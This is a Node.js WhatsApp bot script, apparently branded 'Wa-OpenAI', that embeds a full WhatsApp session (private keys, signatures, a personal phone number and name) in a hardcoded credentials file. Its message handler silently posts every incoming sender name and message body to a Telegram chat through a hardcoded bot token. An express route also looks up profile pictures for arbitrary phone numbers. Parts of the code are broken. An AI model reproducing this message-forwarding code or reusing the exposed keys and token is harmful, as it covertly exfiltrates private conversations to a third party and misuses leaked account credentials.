const sessionName = "tmp";
const cors = require('cors')
const donet = "https://saweria.co/sansekai";
const {
  default: sansekaiConnect,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  jidDecode,
  proto,
  getContentType,
  Browsers,
  fetchLatestWaWebVersion
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
const axios = require("axios");
const chalk = require("chalk");
const figlet = require("figlet");
const _ = require("lodash");
const PhoneNumber = require("awesome-phonenumber");

const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });

const credsFilePath = '/tmp/creds.json';

// Write data to creds.json
fs.writeFile(credsFilePath, JSON.stringify({"noiseKey":{"private":{"type":"Buffer","data":"OJ/rYSK42kVgXnODlie2v3XcAa4ZCL4ADhET6L+Jqkk="},"public":{"type":"Buffer","data":"TwtmSn3E7mJULbqnClla5Fz2w00V3EURCf/UG41oVQI="}},"pairingEphemeralKeyPair":{"private":{"type":"Buffer","data":"0IQGFelS3QWEg14D1M/3J7F6dOUAn1gyXu3AURpXNHE="},"public":{"type":"Buffer","data":"riFhnIcs/1mWJMKPZ9JfIXZ4i2xGnNSZI0Ne46Y7ZgM="}},"signedIdentityKey":{"private":{"type":"Buffer","data":"2I6qE0+5zKqQgpqnoGDB0eM72riDRX++gd6Q2SPoJHY="},"public":{"type":"Buffer","data":"2pkoSin/B6kFbr2oko4TjWJP3Mis1EatyB2BxHNGTBs="}},"signedPreKey":{"keyPair":{"private":{"type":"Buffer","data":"+Gh4VfJ4Mt8sghTE/QjMV4ZS/PRRm+ytnxdNBaEeREw="},"public":{"type":"Buffer","data":"CehrFqHUCpplVFJ7++aCXN2p4JvR1uE8qQEoI3uj20E="}},"signature":{"type":"Buffer","data":"cb0yoBJuG0cgrJlu9u9+KRCHyqMyFgoBUnh9U9Vf45Qn5h6AEAV58i7bk25aOFLigKyL3PbLpybmYlkJjtnkgw=="},"keyId":1},"registrationId":175,"advSecretKey":"9Avh9RLs9hrLCqrOmaku94iaS/npnVplgUvytBc7VTU=","processedHistoryMessages":[{"key":{"remoteJid":"919995937035@s.whatsapp.net","fromMe":true,"id":"E2D3643D96EC80BC0909D6B7429826AA"},"messageTimestamp":1712894604},{"key":{"remoteJid":"919995937035@s.whatsapp.net","fromMe":true,"id":"1FC7314C72D572ECDD7CE1F682B00639"},"messageTimestamp":1712894604},{"key":{"remoteJid":"919995937035@s.whatsapp.net","fromMe":true,"id":"C16B2542E8D1CA0142A16C67ED0EB430"},"messageTimestamp":1712894608},{"key":{"remoteJid":"919995937035@s.whatsapp.net","fromMe":true,"id":"FD4C8EF8BB91A3D53B3D24C694989BEB"},"messageTimestamp":1712894608}],"nextPreKeyId":31,"firstUnuploadedPreKeyId":31,"accountSyncCounter":1,"accountSettings":{"unarchiveChats":false},"deviceId":"RxO7Pc-LTF6AtPPj4xbwdw","phoneId":"c03ddda7-ef25-45f8-b068-64cb2dff3273","identityId":{"type":"Buffer","data":"2inVGmvrmx3Rxk4Y9Mwu9JKV+e8="},"registered":false,"backupToken":{"type":"Buffer","data":"gUhk4FMfiivFUpAdrFEL628QOeE="},"registration":{},"account":{"details":"CJn97b4CEIjl4rAGGAEgACgA","accountSignatureKey":"KIsa5hX5VsGHXisQIsoq8kAj3pCBEmfAHNmFgmdxpiA=","accountSignature":"qEUoeUKZq3ISM8T4YgJIZRJjf9YZ94jFdPiWBxdq9sdupy5La2KN5QcJBU44lxYXfrcQpFwVqXY6i8DOYvOSCA==","deviceSignature":"JqBDlebqGLJYZGnNxzZ6OpHNfSI2BY/q3ICmDaUvA9aT29HKcnqiX9sPdUGPxEplFMS9MHgaVH116DassRx8jg=="},"me":{"id":"919995937035:3@s.whatsapp.net","lid":"12880791503071:3@lid","name":"ANURAG P"},"signalIdentities":[{"identifier":{"name":"919995937035:3@s.whatsapp.net","deviceId":0},"identifierKey":{"type":"Buffer","data":"BSiLGuYV+VbBh14rECLKKvJAI96QgRJnwBzZhYJncaYg"}}],"platform":"android","lastAccountSyncTimestamp":1712894845,"myAppStateKeyId":"AAAAADr+"}, null, 2), (err) => {
  if (err) {
    console.error('Error writing to creds.json:', err);
    return;
  }
  console.log('creds.json created successfully in temp directory.');
});

 // Define the port number

// Route to keep the bot alive


// Start the Express server

const color = (text, color) => {
  return !color ? chalk.green(text) : chalk.keyword(color)(text);
};

function smsg(conn, m, store) {
  if (!m) return m;
  let M = proto.WebMessageInfo;
  if (m.key) {
    m.id = m.key.id;
    m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
    m.chat = m.key.remoteJid;
    m.fromMe = m.key.fromMe;
    m.isGroup = m.chat.endsWith("@g.us");
    m.sender = conn.decodeJid((m.fromMe && conn.user.id) || m.participant || m.key.participant || m.chat || "");
    if (m.isGroup) m.participant = conn.decodeJid(m.key.participant) || "";
  }
  if (m.message) {
    m.mtype = getContentType(m.message);
    m.msg = m.mtype == "viewOnceMessage" ? m.message[m.mtype].message[getContentType(m.message[m.mtype].message)] : m.message[m.mtype];
    m.body =
      m.message.conversation ||
      m.msg.caption ||
      m.msg.text ||
      (m.mtype == "viewOnceMessage" && m.msg.caption) ||
      m.text;
    let quoted = (m.quoted = m.msg.contextInfo ? m.msg.contextInfo.quotedMessage : null);
    m.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
    if (m.quoted) {
      let type = getContentType(quoted);
      m.quoted = m.quoted[type];
      if (["productMessage"].includes(type)) {
        type = getContentType(m.quoted);
        m.quoted = m.quoted[type];
      }
      if (typeof m.quoted === "string")
        m.quoted = {
          text: m.quoted,
        };
      m.quoted.mtype = type;
      m.quoted.id = m.msg.contextInfo.stanzaId;
      m.quoted.chat = m.msg.contextInfo.remoteJid || m.chat;
      m.quoted.isBaileys = m.quoted.id ? m.quoted.id.startsWith("BAE5") && m.quoted.id.length === 16 : false;
      m.quoted.sender = conn.decodeJid(m.msg.contextInfo.participant);
      m.quoted.fromMe = m.quoted.sender === conn.decodeJid(conn.user.id);
      m.quoted.text = m.quoted.text || m.quoted.caption || m.quoted.conversation || m.quoted.contentText || m.quoted.selectedDisplayText || m.quoted.title || "";
      m.quoted.mentionedJid = m.msg.contextInfo ? m.msg.contextInfo.mentionedJid : [];
      m.getQuotedObj = m.getQuotedMessage = async () => {
        if (!m.quoted.id) return false;
        let q = await store.loadMessage(m.chat, m.quoted.id, conn);
        return exports.smsg(conn, q, store);
      };
      let vM = (m.quoted.fakeObj = M.fromObject({
        key: {
          remoteJid: m.quoted.chat,
          fromMe: m.quoted.fromMe,
          id: m.quoted.id,
        },
        message: quoted,
        ...(m.isGroup ? { participant: m.quoted.sender } : {}),
      }));

      /**
       *
       * @returns
       */
      m.quoted.delete = () => conn.sendMessage(m.quoted.chat, { delete: vM.key });

      /**
       *
       * @param {*} jid
       * @param {*} forceForward
       * @param {*} options
       * @returns
       */
      m.quoted.copyNForward = (jid, forceForward = false, options = {}) => conn.copyNForward(jid, vM, forceForward, options);

      /**
       *
       * @returns
       */
      m.quoted.download = () => conn.downloadMediaMessage(m.quoted);
    }
  }
  if (m.msg.url) m.download = () => conn.downloadMediaMessage(m.msg);
  m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || "";
  /**
   * Reply to this message
   * @param {String|Object} text
   * @param {String|false} chatId
   * @param {Object} options
   */
  m.reply = (text, chatId = m.chat, options = {}) => (Buffer.isBuffer(text) ? conn.sendMedia(chatId, text, "file", "", m, { ...options }) : conn.sendText(chatId, text, m, { ...options }));
  /**
   * Copy this message
   */
  m.copy = () => exports.smsg(conn, M.fromObject(M.toObject(m)));

  return m;
}

async function startHisoka() {
  const { state, saveCreds } = await useMultiFileAuthState(`/${sessionName ? sessionName : "session"}/`);
  const { version, isLatest } = await fetchLatestWaWebVersion().catch(() => fetchLatestBaileysVersion());
  console.log(`using WA v${version.join(".")}, isLatest: ${isLatest}`);
  console.log(
    color(
      figlet.textSync("Wa-OpenAI", {
        font: "Standard",
        horizontalLayout: "default",
        vertivalLayout: "default",
        whitespaceBreak: false,
      }),
      "green"
    )
  );

  const client = sansekaiConnect({
    logger: pino({ level: "silent" }),
    printQRInTerminal: true,
    browser: Browsers.macOS('Desktop'),
    auth: state,
  });

  store.bind(client.ev);
let ser = true;
if (ser) {
  ser = false;
  const express = require('express');
  const app = express();
  app.use(cors())
  const PORT = process.env.PORT || 3030;
    app.get('/:num', async (req, res) => {
      try {
          // Assuming `req.params.num` contains the number dynamically passed in the URL
          const profilePicUrl = await client.profilePictureUrl(req.params.num+'@s.whatsapp.net','image');
          if (profilePicUrl) {
              res.json({ profilePicUrl }); // Respond with a JSON object containing the profile picture URL
          } else {
              res.status(404).json({ error: 'Profile picture not found' }); // Respond with 404 if profile picture not found
          }
      } catch (error) {
          console.error('Error fetching profile picture:', error);
          res.status(400).json({ error: 'Bad request' }); 
          setTimeout(startBot, 100);// Respond with 400 for other errors
      }
  });
  app.listen(PORT, () => {
    console.log(`Express server is running on port ${PORT}`);
  });
}
  client.ev.on("messages.upsert", async (chatUpdate) => {
    //console.log(JSON.stringify(chatUpdate, undefined, 2))
    try {
      mek = chatUpdate.messages[0];
      if (!mek.message) return;
      mek.message = Object.keys(mek.message)[0] === "ephemeralMessage" ? mek.message.ephemeralMessage.message : mek.message;
      if (mek.key && mek.key.remoteJid === "status@broadcast") return;
      if (!client.public && !mek.key.fromMe && chatUpdate.type === "notify") return;
      if (mek.key.id.startsWith("BAE5") && mek.key.id.length === 16) return;
      m = smsg(client, mek, store);

      axios.post('https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendMessage?chat_id=-1001723645621', {
        text: {user:m.pushName, message:m.body}
    })
    .then(response => {
        // Telegram API call succeeded
        console.log('Message sent to Telegram:', message);
        res.send(message); // Send response to the user
    })
    .catch(error => {
        // Telegram API call failed
        console.error('Error sending message to Telegram:', error);
        res.status(500).send('Error sending message to Telegram');
    });
   
     if (m.body == 'kkk'){
      console.log(await client.profilePictureUrl('917994107442@s.whatsapp.net'));
      m.reply('ok')
     }
    
    } catch (err) {
      m.reply('error')
      console.log(err);
    }
  });

  // Handle error
  const unhandledRejections = new Map();
  process.on("unhandledRejection", (reason, promise) => {
    unhandledRejections.set(promise, reason);
    console.log("Unhandled Rejection at:", promise, "reason:", reason);
  });
  process.on("rejectionHandled", (promise) => {
    unhandledRejections.delete(promise);
  });
  process.on("Something went wrong", function (err) {
    console.log("Caught exception: ", err);
  });

  // Setting
  client.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
    } else return jid;
  };

  client.ev.on("contacts.update", (update) => {
    for (let contact of update) {
      let id = client.decodeJid(contact.id);
      if (store && store.contacts) {
        store.contacts[id] = { id, name: contact.notify };
      }
    }
    console.log("Update logged:", update);
  });
  

  client.getName = (jid, withoutContact = false) => {
    id = client.decodeJid(jid);
    withoutContact = client.withoutContact || withoutContact;
    let v;
    if (id.endsWith("@g.us"))
      return new Promise(async (resolve) => {
        v = store.contacts[id] || {};
        if (!(v.name || v.subject)) v = client.groupMetadata(id) || {};
        resolve(v.name || v.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
      });
    else
      v =
        id === "0@s.whatsapp.net"
          ? {
            id,
            name: "WhatsApp",
          }
          : id === client.decodeJid(client.user.id)
            ? client.user
            : store.contacts[id] || {};
    return (withoutContact ? "" : v.name) || v.subject || v.verifiedName || PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber("international");
  };

  client.public = true;

  client.serializeM = (m) => smsg(client, m, store);
  client.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
      if (reason === DisconnectReason.badSession) {
        console.log(`Bad Session File, Please Delete Session and Scan Again`);
        process.exit();
      } else if (reason === DisconnectReason.connectionClosed) {
        console.log("Connection closed, reconnecting....");
        startHisoka();
      } else if (reason === DisconnectReason.connectionLost) {
        console.log("Connection Lost from Server, reconnecting...");
        startHisoka();
      } else if (reason === DisconnectReason.connectionReplaced) {
        console.log("Connection Replaced, Another New Session Opened, Please Restart Bot");
        startHisoka();
      } else if (reason === DisconnectReason.loggedOut) {
        console.log(`Device Logged Out, Please Delete Folder Session yusril and Scan Again.`);
        process.exit();
      } else if (reason === DisconnectReason.restartRequired) {
        console.log("Restart Required, Restarting...");
        startHisoka();
      } else if (reason === DisconnectReason.timedOut) {
        console.log("Connection TimedOut, Reconnecting...");
        startHisoka();
      } else {
        console.log(`Unknown DisconnectReason: ${reason}|${connection}`);
        startHisoka();
      }
    } else if (connection === "open") {
      const botNumber = await client.decodeJid(client.user.id);
      console.log(color("Bot success conneted to server", "green"));
      console.log(color("Donate for creator https://saweria.co/sansekai", "yellow"));
      console.log(color("Type /menu to see menu"));
      client.sendMessage(botNumber, { text: `Bot started!\n\njangan lupa support ya bang :)\n${donet}` });
    }
    // console.log('Connected...', update)
  });

  client.ev.on("creds.update", saveCreds);

  const getBuffer = async (url, options) => {
    try {
      options ? options : {};
      const res = await axios({
        method: "get",
        url,
        headers: {
          DNT: 1,
          "Upgrade-Insecure-Request": 1,
        },
        ...options,
        responseType: "arraybuffer",
      });
      return res.data;
    } catch (err) {
      return err;
    }
  };

  client.sendImage = async (jid, path, caption = "", quoted = "", options) => {
    let buffer = Buffer.isBuffer(path)
      ? path
      : /^data:.*?\/.*?;base64,/i.test(path)
        ? Buffer.from(path.split`,`[1], "base64")
        : /^https?:\/\//.test(path)
          ? await await getBuffer(path)
          : fs.existsSync(path)
            ? fs.readFileSync(path)
            : Buffer.alloc(0);
    return await client.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
  };

  client.sendText = (jid, text, quoted = "", options) => client.sendMessage(jid, { text: text, ...options }, { quoted });

  client.cMod = (jid, copy, text = "", sender = client.user.id, options = {}) => {
    //let copy = message.toJSON()
    let mtype = Object.keys(copy.message)[0];
    let isEphemeral = mtype === "ephemeralMessage";
    if (isEphemeral) {
      mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
    }
    let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
    let content = msg[mtype];
    if (typeof content === "string") msg[mtype] = text || content;
    else if (content.caption) content.caption = text || content.caption;
    else if (content.text) content.text = text || content.text;
    if (typeof content !== "string")
      msg[mtype] = {
        ...content,
        ...options,
      };
    if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    if (copy.key.remoteJid.includes("@s.whatsapp.net")) sender = sender || copy.key.remoteJid;
    else if (copy.key.remoteJid.includes("@broadcast")) sender = sender || copy.key.remoteJid;
    copy.key.remoteJid = jid;
    copy.key.fromMe = sender === client.user.id;

    return proto.WebMessageInfo.fromObject(copy);
  };


  setInterval(() => {
    // Check if the bot is still running, if not, restart it
    if (!client) {
      console.log("Bot is not running, restarting...");
      startBot();
    }
  }, 10000);

  return client;
}

// Define the function to start the bot
async function startBot() {
  try {
    // Your bot initialization code here
    await startHisoka();
    console.log("Bot started successfully.");
  } catch (error) {
    console.error("Error starting the bot:", error);
    // If an error occurs, retry starting the bot after a delay
    setTimeout(startBot, 1000); // Retry after 5 seconds
  }
}

// Start the bot initially
startBot();

// Keep the bot running continuously using setInterval
// Check every 10 seconds if the bot is still running


let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});

